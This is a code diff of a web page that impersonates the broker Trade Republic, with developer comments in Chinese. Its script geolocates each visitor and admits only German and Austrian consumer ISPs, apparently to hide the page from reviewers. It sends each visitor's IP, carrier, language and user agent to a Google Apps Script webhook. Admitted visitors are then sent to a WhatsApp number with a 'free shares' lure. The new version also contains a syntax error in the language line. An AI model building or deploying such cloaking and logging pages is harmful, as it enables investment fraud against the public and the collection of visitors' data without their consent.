@@ -2,96 +2,127 @@
 <html lang="de">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Trade Republic</title>
+  <title>Trade Republic - Willkommen</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
+    #status { font-size: 1.2em; margin-top: 20px; }
+  </style>
 </head>
 <body>
-  <h2 id="status">Willkommen bei Trade Republic – bitte warten...</h2>
+  <h1>Trade Republic heißt Sie willkommen</h1>
+  <p id="status">Überprüfung läuft...</p>
 
   <script>
-    const allowCountries = ["DE", "AT"];
-    const whiteListISP = [
-   const whiteListISP = [
-  // 🇩🇪 德国主流运营商
-  "Deutsche Telekom", "Telekom", "T-Mobile", "t-online",
-  "Vodafone", "O2", "Telefonica", "1&1", "1und1", "Unitymedia",
-  "Congstar", "Aldi Talk", "NetCologne", "PYUR", "Drillisch", "Mobilcom", "Freenet", "E-Plus",
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxUZUPpwihLRC4UVCPMDOFr64WfWhemdVxWwLqxXFhg2U6w0uBfz5Bl5KKO5w3ipgFP/exec";
+    const WHATSAPP_LINK = "https://api.whatsapp.com/send/?phone=491633490432&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos";
 
-  // 🇦🇹 奥地利主流运营商
-  "A1 Telekom", "A1", "Magenta", "T-Mobile", "Drei", "Hutchison", "bob", "HoT", "Spusu", "Yesss"
-];
+    const ALLOWED_COUNTRIES = ["DE", "AT"];
+    const ALLOWED_ISPS = [
+      // 德国运营商
+      "Deutsche Telekom", "Telekom", "T-Mobile", "Congstar",
+      "Vodafone", "Otelo",
+      "Telefónica", "O2", "Blau", "ALDI TALK",
+      "1&1", "Drillisch", "winSIM", "smartmobil", "PremiumSIM",
+      "Freenet", "Klarmobil", "Lidl Connect",
+      // 奥地利运营商
+      "A1 Telekom", "A1", "Magenta Telekom", "Magenta", "T-Mobile Austria",
+      "Drei", "Hutchison Drei", "HoT", "Hofer Telekom",
+      "Spusu", "Yesss!", "Educom", "bob", "Liwest", "Lidl Connect"
+    ];
 
-    const webhook = "https://script.google.com/macros/s/AKfycbwtCtnjbqfNL3_I5p5_F4XSHhos1yxH4_WJbQrfWfhWum3D1FiUYjhtNh4jPhGmBa9pgA/exec";
-    const redirect = "https://api.whatsapp.com/send/?phone=491639447584&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos&type=phone_number&app_absent=0";
-
-    const visitLimit = 20;
-    const blockDuration = 2 * 60 * 1000; // 2分钟
+    const RATE_LIMIT_TIME = 2 * 60 * 1000; // 2 分钟
+    const RATE_LIMIT_MAX = 20;
+    const RATE_LIMIT_STORAGE_KEY = "visit_timestamps";
 
     function updateStatus(msg) {
       document.getElementById("status").innerText = msg;
     }
 
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      if (/mobile/i.test(ua)) return "Handy";
-      if (/tablet/i.test(ua)) return "Tablet";
-      return "PC";
+    async function getVisitorInfo() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+      } catch {
+        return {};
+      }
     }
 
-    function isBlocked() {
+    function checkRateLimit() {
       const now = Date.now();
-      const history = JSON.parse(localStorage.getItem("visitHistory") || "[]").filter(ts => now - ts < blockDuration);
-      history.push(now);
-      localStorage.setItem("visitHistory", JSON.stringify(history));
-      return history.length > visitLimit;
+      let visits = JSON.parse(localStorage.getItem(RATE_LIMIT_STORAGE_KEY) || "[]");
+      visits = visits.filter(ts => now - ts < RATE_LIMIT_TIME);
+      visits.push(now);
+      localStorage.setItem(RATE_LIMIT_STORAGE_KEY, JSON.stringify(visits));
+      return visits.length > RATE_LIMIT_MAX;
     }
 
-    function isAllowedISP(isp) {
-      return whiteListISP.some(name => isp.toLowerCase().includes(name.toLowerCase()));
+    function isAllowedCountry(country) {
+      return ALLOWED_COUNTRIES.includes(country);
+    }
+
+    function isAllowedISP(org) {
+      if (!org) return false;
+      const lowerOrg = org.toLowerCase();
+      return ALLOWED_ISPS.some(isp => lowerOrg.includes(isp.toLowerCase()));
+    }
+
+    async function logVisit(data) {
+      try {
+        await fetch(GOOGLE_SCRIPT_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data),
+        });
+      } catch (e) {
+        console.error("日志上传失败", e);
+      }
     }
 
     async function main() {
-      if (isBlocked()) {
-        updateStatus("Zugriff gesperrt: Zu viele Anfragen.");
-        return;
+      updateStatus("Daten werden überprüft...");
+
+      const info = await getVisitorInfo();
+
+      const ip = info.ip || "未知";
+      const country = info.country || "未知";
+      const org = info.org || "未知";
+      const language = navigator.language  navigator.userLanguage  "未知";
+      const ua = navigator.userAgent || "未知";
+
+      const blockedByRateLimit = checkRateLimit();
+      const countryAllowed = isAllowedCountry(country);
+      const ispAllowed = isAllowedISP(org);
+
+      let statusText = "";
+      let jumpStatus = "跳转失败";
+
+      if (blockedByRateLimit) {
+        statusText = "访问过于频繁，已被限制访问。";
+      } else if (!countryAllowed) {
+        statusText = "抱歉，仅允许德国和奥地利访问。";
+      } else if (!ispAllowed) {
+        statusText = "抱歉，您的网络运营商不被允许访问。";
+      } else {
+        statusText = "验证通过，页面即将跳转...";
+        jumpStatus = "跳转成功";
       }
 
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-        const country = data.country || "";
-        const isp = data.org || "Unbekannt";
-        const ip = data.ip || "";
-        const lang = navigator.language || "";
-        const device = getDeviceInfo();
+      updateStatus(statusText);
 
-        let allow = allowCountries.includes(country) && isAllowedISP(isp);
-        let jump = allow;
+      await logVisit({
+        timestamp: new Date().toISOString(),
+        ip,
+        country,
+        carrier: org,
+        language,
+        device: ua,
+        status: jumpStatus
+      });
 
-        if (jump) {
-          window.location.href = redirect;
-          updateStatus("Weiterleitung erfolgreich...");
-        } else {
-          updateStatus("Zugriff verweigert: Nur für Deutschland und Österreich mit zugelassenem Anbieter.");
-        }
-
-        // 上传记录到 Google Sheet
-        fetch(webhook, {
-          method: "POST",
-          body: JSON.stringify({
-            ip: ip,
-            country: country,
-            isp: isp,
-            lang: lang,
-            device: device,
-            success: jump ? "ja" : "nein",
-            time: new Date().toISOString()
-          }),
-          headers: { "Content-Type": "application/json" }
-        });
-
-      } catch (e) {
-        updateStatus("Netzwerkfehler. Bitte später erneut versuchen.");
+      if (jumpStatus === "跳转成功") {
+        setTimeout(() => {
+          window.location.href = WHATSAPP_LINK;
+        }, 1500);
       }
     }
 
